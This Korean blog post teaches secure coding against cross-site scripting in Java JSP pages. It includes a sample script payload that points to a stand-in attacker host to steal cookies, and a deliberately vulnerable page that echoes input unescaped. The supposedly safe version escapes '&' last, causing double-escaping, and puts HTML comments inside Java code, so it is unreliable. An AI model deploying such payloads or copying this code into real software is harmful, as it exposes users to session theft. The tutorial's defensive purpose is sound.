---
title: Java 크로스 사이트 스크립트 코딩 기법
author: dejavuhyo
date: 2021-09-14 06:00:00 +0900
categories: [Language, Java]
tags: [cross-site-scripting, 크로스-사이트-스크립트]
---

## 1. 정의
크로스 사이트 스크립트(Improper Neutralization of Input During Web Page Generation, Cross-site Scripting)는 웹 페이지에 악의적인 스크립트를 포함해 사용자 측에서 실행되게 유도할 수 있다.

예를 들어 검증되지 않은 외부 입력이 동적 웹 페이지 생성에 사용될 경우, 전송된 동적 웹 페이지를 열람하는 접속자의 권한으로 부적절한 스크립트가 수행되어 정보 유출 등의 공격을 유발할 수 있다.

![cross-site-scripting](/assets/img/2021-09-14-cross-site-scripting/cross-site-scripting.png)

## 2. 안전한 코딩 기법

* 일반적으로는 사용자가 문자열에 스크립트를 삽입하여 실행하는 것을 막기 위해 사용자가 입력한 문자열에서 `<, >, &, "` 등을 replace 등의 문자 변환 함수나 메소드를 사용하여 `&lt, &gt, &amp, &quot`로 치환한다.

* HTML 태그를 허용하는 게시판에서는 게시판에서 지원하는 HTML 태그의 리스트(White List)를 선정한 후, 해당 태그만 허용하는 방식을 적용한다.

* 보안성이 검증된 API를 사용하여 위험한 문자열을 제거하여야 한다.

## 3. 예제
다음의 예제는 외부 입력을 name 값으로, 특별한 처리 과정 없이 결과 페이지 생성에 사용하고 있다. 만약 악의적인 공격자가 name 값에 다음의 스크립트를 넣으면, 희생자의 권한으로 attack.jsp 코드가 수행되게 되며, 수행하게 되면 희생자의 쿠키 정보 유출 등의 피해를 주게 된다.

```html
<script>url = "http://devil.com/attack.jsp;"</script>
```

* 안전하지 않은 코드의 예

```jsp
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <h1>XSS Sample</h1>
        <%
        <!- 외부로 부터 이름을 받음 -->
        String name = request.getParameter("name");
        %>
        <!-- 외부로 부터 받은 name이 그대로 출력 -->
        <p>NAME:<%=name%></p>
    </body>
</html>
```

다음의 예제와 같이 외부 입력 문자열에서 replaceAll() 메소드를 사용하여 `<`와 `>` 같이 HTML에서 스크립트 생성에 사용되는 모든 문자열을 `&lt;, &gt;, &amp;, &quot;` 같은 형태로 변경함으로써 악의적인 스크립트 실행의 위험성을 줄일 수 있다. 그러나 이러한 방법이 위험성을 완전히 저거 했음을 의미하지는 않는다.

* 안전한 코드의 예

```jsp
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>
    
    <body>
        <h1>XSS Sample</h1>
        <%
        <!-- 외부로 부터 이름을 받음 -->
        String name = request.getParameter("name");
        
        <!-- 외부의 입력값에 대한 검증을 한다. -->
        if ( name != null ) {
            name = name.replaceAll("<","&lt;");
            name = name.replaceAll(">","&gt;");
            name = name.replaceAll("&","&amp;");
            name = name.replaceAll("\"","&quot;");
        } else {
            return;
        }
        %>
        <!-- 외부 로 부터 받은 name에서 '위험 문자'를 제거한 후 출력 -->
        <p>NAME:<%=name%></p>
    </body>
</html>
```

## [출처 및 참고]
* [https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=6&mode=view&p_No=259&b_No=259&d_No=55&ST=T&SV=](https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=6&mode=view&p_No=259&b_No=259&d_No=55&ST=T&SV=)
